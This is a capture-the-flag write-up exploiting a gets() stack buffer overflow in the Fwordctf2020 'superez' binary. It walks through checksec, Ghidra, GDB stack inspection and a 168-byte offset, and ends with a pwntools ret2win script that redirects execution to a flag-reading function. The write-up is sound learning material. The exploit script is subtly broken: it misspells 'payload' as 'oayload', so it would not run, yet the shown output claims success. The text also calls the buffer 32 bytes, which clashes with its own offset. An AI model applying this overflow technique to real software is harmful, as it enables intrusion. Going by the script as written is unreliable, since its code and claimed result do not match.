# Fwordctf2020 Superez

Let's begin by inspecting the file, and its protections:

```
mfumega@pwn-boy:/pwn-boy$ file ./superez
./superez: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7ff6ed31455f3956d093833c02d0c0320253657e, not stripped
mfumega@pwn-boy:/pwn-boy$ pwn checksec ./superez
[*] '/pwn-boy/superez'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
We are dealing with a 64 bites binary, little endian, and from this output we know that:
- We can overwrite some sections of the Global Offset Table (GOT)
- The stack is Not-Executable. So we can't inject shellcode and run it on the stack

Let's run it. 

```
mfumega@pwn-boy:/pwn-boy$ ./superez
Welcome to FwordxKahla Platform, I'll miss Boruto episode because of the CTF :angry:
So solve me pleasee

Enter Your password to continue:
you typed 'AAAA', Good Bye!
```

Ok, after opening the binary with Ghidra, there is a main function. 

It calls a function `print_header()` that prints on screen the text we just saw. After initializing a few variables, we see the following code snipet:

```
    printf("Enter Your password to continue: ");
    gets(local_a8);
    printf("you typed \'%s\', Good Bye!\n",local_a8);
```

It's capturing our input with the insecure function `gets()`, and it stores that on the "local_a8" variable.

From the first lines of the main function, where the variables are initialized, we know that "local_a8" is a 32 bytes variable. So, we have a stack buffer overflow here.

If we keep looking at the binary on Ghidra, we'll find  a function called `rasengan`, which is opening the "flag.txt" file. So, let's try to solve this challenge as a regular ret2win. Where we redirect the program flow to a desired address we of our choice. 

Let's run the binary on GDB, and take a look at how the stack is after `gets()`is called. 

```
     0x400ae6 <main+00ec>      call   0x4007c0 <gets@plt>
 →   0x400aeb <main+00f1>      lea    rax, [rbp-0xa0]
     0x400af2 <main+00f8>      mov    rsi, rax
     0x400af5 <main+00fb>      lea    rdi, [rip+0x1d6]        # 0x400cd2
     0x400afc <main+0102>      mov    eax, 0x0
     0x400b01 <main+0107>      call   0x400790 <printf@plt>
     0x400b06 <main+010c>      mov    rax, QWORD PTR [rip+0x2015a3]        # 0x6020b0 <stdin@@GLIBC_2.2.5>
────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "superez", stopped 0x400aeb in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400aeb → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/25gx $rsp
0x7fffffffdc70: 0x0000000041414141      0x0000000000000000
0x7fffffffdc80: 0x0000000000000000      0x00007ffff7fe48e0
0x7fffffffdc90: 0x0000000500004500      0x00008a73000000bf
0x7fffffffdca0: 0x010004157f1c0300      0x170f12001a131100
0x7fffffffdcb0: 0x0000000000000016      0x0000000000000000
0x7fffffffdcc0: 0x0000000f00001000      0x00007fff0000000f
0x7fffffffdcd0: 0x0000000500004500      0x00008a3b000000bf
0x7fffffffdce0: 0x010004157f1c0300      0x170f12001a131100
0x7fffffffdcf0: 0x0000000000000016      0x0000000000000000
0x7fffffffdd00: 0x0000000f00001000      0x000000000000000f
0x7fffffffdd10: 0x0000000000000001      0x00007ffff7da8d90
0x7fffffffdd20: 0x0000000000000000      0x00000000004009fa
0x7fffffffdd30: 0x00000001ffffde10
gef➤
```

We set a breakpoint at 0x400aeb. We run the program, and input 'AAAA'. We continue the execution, hit the breakpoint, and inspect the stack and we can see our input '41414141'. 

By looking at the stack this way, sometimes we may be able to recognize where the program will jump after, because well see an address that looks like the base one (0x400aeb in this case), but to be sure, we can just continue the execution up to the RET instruction on the function we are in.

```
 →   0x400b47 <main+014d>      ret
   ↳  0x7ffff7da8d90 <__libc_start_call_main+0080> mov    edi, eax
```
Here we see that the program is trying the jump to the address 0x7ffff7da8d90. And when we inspected the stack we saw this same value at 0x7fffffffdd18. 

```
gef➤  p *0x7fffffffdd18
$2 = 0xf7da8d90
```

So, if we overwrite that value with the address of the function `rasengan` which is
```
gef➤  p rasengan
$7 = {<text variable, no debug info>} 0x400917 <rasengan>
gef➤
```

We should get the flag. If we do some math, we can substract the address at where out input starts to the address where the return address is, and we can get the offset. `(0x7fffffffdd18 - 0x7fffffffdc70) = 168`

Let's build the exploit.

```
#!/usr/bin/env python3
from pwn import *
p = process('/pwn-boy/superez', stdin=PTY, stdout=PTY)

p.recvuntil('continue: ')
offset = 168

payload = b'A' * offset 
oayload += p64(0x400918) 

p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1'))
```

We run it, and we got the flag!
```
mfumega@pwn-boy:/pwn-boy$ ./do.py
[+] Starting local process '/pwn-boy/superez': pid 479859
/pwn-boy/./do.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('continue: ')
[+] Receiving all data: Done (319B)
[*] Process '/pwn-boy/superez' stopped with exit code -11 (SIGSEGV) (pid 479859)
you typed 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18 @', Good Bye!
local{mock_flag}
```


